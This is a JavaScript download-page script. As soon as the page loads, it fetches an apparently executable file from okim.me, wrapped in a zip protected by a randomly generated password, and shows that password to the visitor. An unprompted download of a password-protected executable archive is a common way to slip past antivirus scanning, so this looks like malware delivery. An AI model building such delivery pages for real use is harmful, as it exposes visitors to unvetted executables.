var DownloadPage = function () {
  var progress = function () {
    var timer = setInterval(() => {
      var element = document.getElementById('progress');
      var width = parseInt(element.style.width);
      if(width >= 100) {
        clearInterval(timer);
      }else{
        width *= 2;
        $("#progress").css({ width: `${width}%` });
      }
    })
  }

  var download = function () {
    var password = rand(1000, 9999);
    $("#password").text(password);
    fetch(`https://okim.me/ajax/protect.php?password=${password}&exe=${exe}`, {
      headers: {
        "x-click": Date.now()
      }
    }).then(response => response.blob()).then(blob => {
      var a = document.createElement('a');
      a.href = URL.createObjectURL(blob);
      a.download = zip;
      a.click();
      $("#progress").css({ width: '100%' });
      $("#title").text("Download Complete");
      $("#description").text("Your file has been downloaded successfully");
      $("#password-section").removeClass("d-none");
    });
  }

  return {
    init: function () {
      progress();
      download();
    }
  };
}();

KTUtil.onDOMContentLoaded(function () {
  DownloadPage.init();
});

function rand(min, max) {
  return Math.floor(Math.random() * (max - min)) + min;
}
